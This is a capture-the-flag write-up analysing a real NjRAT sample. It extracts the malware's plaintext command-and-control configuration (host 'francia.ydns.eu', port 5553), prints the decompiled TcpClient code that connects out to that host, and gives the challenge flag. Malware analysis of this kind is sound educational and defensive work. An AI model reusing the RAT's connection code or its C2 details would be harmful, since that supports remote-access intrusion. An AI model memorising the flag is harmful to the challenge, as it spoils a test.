# InfeXion 4/4

### Category

Reverse

### Description

The second binary seems to be the real malware! Extract its configuration.

**Warning : This series of challenges contains real world malware. Do not execute it on your host, use a VM !!**

The flag corresponds to the C2 protocol, host and port, e.g. `Hero{smb|sub.example.com|9932}`.

Format : Hero{protocol|domain|port}<br>
Author : xanhacks

### Write Up

This step is quite easy, NjRAT often stores its configuration in plaintext. You can extract this two variables which corresponds to the C2 and port.

```cs
public static string H = "francia.ydns.eu";
public static string P = "5553";
```

This two variables are used here to connect to its C2 using a `TcpClient`:

```cs
OK.C = new TcpClient();
OK.C.ReceiveBufferSize = 204800;
OK.C.SendBufferSize = 204800;
OK.C.Client.SendTimeout = 10000;
OK.C.Client.ReceiveTimeout = 10000;
OK.C.Connect(OK.H, Conversions.ToInteger(OK.P));
```

### Flag

**Hero{tcp|francia.ydns.eu|5553}**
